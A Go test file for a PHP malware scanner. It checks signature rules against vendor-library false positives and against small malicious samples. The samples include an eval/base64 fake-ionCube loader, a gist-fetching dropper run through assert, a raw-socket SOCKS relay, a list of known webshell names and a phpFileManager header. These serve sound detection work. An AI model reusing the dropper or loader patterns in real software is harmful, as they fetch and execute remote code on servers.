package signatures

import "testing"

// Library and cache code that the default ignore list used to hide from the
// realtime engine. Each rule below fired on stock third-party code once those
// paths were scanned; the samples are reduced from the published libraries.

func TestFPVendor_YML_IonCubeFake_ComposerDiagnose(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte(`<?php
namespace Composer\Command;

class DiagnoseCommand extends BaseCommand
{
    private function checkPlatform()
    {
        $warnings = array();
        if (extension_loaded('ionCube Loader') && ioncube_loader_iversion() < 40009) {
            $warnings['ioncube'] = ioncube_loader_version();
        }
        foreach ($warnings as $warning => $current) {
            switch ($warning) {
                case 'ioncube':
                    $text = "Your ionCube Loader extension (".$current.") is incompatible with Phar files.";
                    break;
            }
        }
        return $warnings;
    }
}
`)
	if hasRule(s.ScanContent(legit, ".php"), "obfuscation_ionCube_fake") {
		t.Error("obfuscation_ionCube_fake FP: matched an ionCube extension check with no decoder")
	}
}

func TestFPVendor_YML_IonCubeFake_MarkerBeforeLoader(t *testing.T) {
	s := loadRepoScanner(t)
	loader := []byte(`<?php
/* This file is protected by ionCube Encoder */
eval(gzinflate(base64_decode('S03OyFdIzs8rSc0rUVTyyM/LU0hKLM4pzs9RBAA=')));
`)
	if !hasRule(s.ScanContent(loader, ".php"), "obfuscation_ionCube_fake") {
		t.Error("obfuscation_ionCube_fake missed a fake ionCube loader that names the encoder before its decoder")
	}
}

func TestFPVendor_YML_IonCubeFake_DecoderFarFromMarker(t *testing.T) {
	s := loadRepoScanner(t)
	padding := make([]byte, 900)
	for i := range padding {
		padding[i] = ' '
	}
	far := []byte("<?php\n// requires the ionCube Loader extension\n" + string(padding) +
		"\n$data = eval(base64_decode($blob));\n")
	if hasRule(s.ScanContent(far, ".php"), "obfuscation_ionCube_fake") {
		t.Error("obfuscation_ionCube_fake FP: matched a decoder outside the proximity window")
	}
}

func TestFPVendor_YML_GistDropper_TestFixtureURL(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte(`<?php
namespace Core\Tests;

class EndToEndTest extends TestCase
{
    public function testFileDownload()
    {
        $request = new Request('https://gist.githubusercontent.com/example/abc/raw/fixture.json');
        $response = $this->client->send($request);
        $this->assertEquals(200, $response->getStatusCode());
    }
}
`)
	if hasRule(s.ScanContent(legit, ".php"), "php_dropper_gist") {
		t.Error("php_dropper_gist FP: matched a test that only downloads a gist fixture")
	}
}

func TestFPVendor_YML_GistDropper_CallbackLoader(t *testing.T) {
	s := loadRepoScanner(t)
	dropper := []byte(`<?php
$code = file_get_contents('https://gist.githubusercontent.com/a/b/raw/stage2.txt');
call_user_func('assert', $code);
`)
	if !hasRule(s.ScanContent(dropper, ".php"), "php_dropper_gist") {
		t.Error("php_dropper_gist missed a gist payload passed to call_user_func")
	}
}

const socks5StreamClient = `<?php
/**
 * SOCKS5 proxy connection class
 */
class HTTP_Request2_SOCKS5 extends HTTP_Request2_SocketWrapper
{
    public function __construct($address, $timeout = 10, array $contextOptions = array())
    {
        parent::__construct($address, $timeout, $contextOptions);
        $this->write(pack('C3', 5, 1, 0));
        $response = unpack('Cversion/Cmethod', $this->read(3));
        if (5 != $response['version']) {
            throw new HTTP_Request2_MessageException('Invalid version received from SOCKS5 proxy');
        }
    }

    protected function connect($remoteHost, $remotePort)
    {
        $request = pack('C5', 0x05, 0x01, 0x00, 0x03, strlen($remoteHost)) . $remoteHost . pack('n', $remotePort);
        $this->write($request);
    }
}
`

func TestFPVendor_YML_SocksProxy_StreamClient(t *testing.T) {
	s := loadRepoScanner(t)
	if hasRule(s.ScanContent([]byte(socks5StreamClient), ".php"), "network_socks_proxy") {
		t.Error("network_socks_proxy FP: matched a SOCKS5 client that opens no raw socket")
	}
}

func TestFPVendor_YML_SocksProxy_SocketRelay(t *testing.T) {
	s := loadRepoScanner(t)
	relay := []byte(`<?php
$srv = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($srv, '0.0.0.0', 1080);
socket_listen($srv);
$c = socket_accept($srv);
$hello = socket_read($c, 3); // SOCKS greeting
socket_write($c, chr(0x05) . chr(0x00));
$up = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($up, $host, $port);
`)
	if !hasRule(s.ScanContent(relay, ".php"), "network_socks_proxy") {
		t.Error("network_socks_proxy missed a raw-socket SOCKS relay")
	}
}

func TestFPVendor_YML_PHPFileManager_EncodedBlob(t *testing.T) {
	s := loadRepoScanner(t)
	// Encoder output: base64 text that happens to spell the short project
	// abbreviation, with no file manager code anywhere.
	encoded := []byte(`<?php //0046b
if(!extension_loaded('example_loader')){die('This file needs a PHP loader extension');}
?>
Q2xhc3NpYyBlbmNvZGVkIGJvZHkgd2l0aCBubyBjb2RlIGluIGl0IGF0IGFsbA0K3TphpFmW7uYq9Lk2Rr8sD0eJ+/x1Nb
`)
	if hasRule(s.ScanContent(encoded, ".php"), "webshell_phpfilemanager") {
		t.Error("webshell_phpfilemanager FP: matched the abbreviation inside encoded data")
	}
}

func TestFPVendor_YML_PHPFileManager_SignatureList(t *testing.T) {
	s := loadRepoScanner(t)
	list := []byte(`<?php
$known_shells = array('c99', 'r57', 'wso', 'phpFileManager', 'tinyfilemanager');
`)
	if hasRule(s.ScanContent(list, ".php"), "webshell_phpfilemanager") {
		t.Error("webshell_phpfilemanager FP: matched a list that only names the tool")
	}
}

func TestFPVendor_YML_PHPFileManager_RealHead(t *testing.T) {
	s := loadRepoScanner(t)
	head := []byte(`<?php
//{"fm_lang":"","fm_root":"","fm_timezone":"","fm_pass_md5":"","fm_error_reporting":1}
/*--------------------------------------------------
 | phpFileManager
 +--------------------------------------------------*/
$fm_path_info = pathinfo($_SERVER['SCRIPT_FILENAME']);
$fm_current_root = $fm_path_info['dirname'];
`)
	if !hasRule(s.ScanContent(head, ".php"), "webshell_phpfilemanager") {
		t.Error("webshell_phpfilemanager missed the opening of a real phpFileManager install")
	}
}
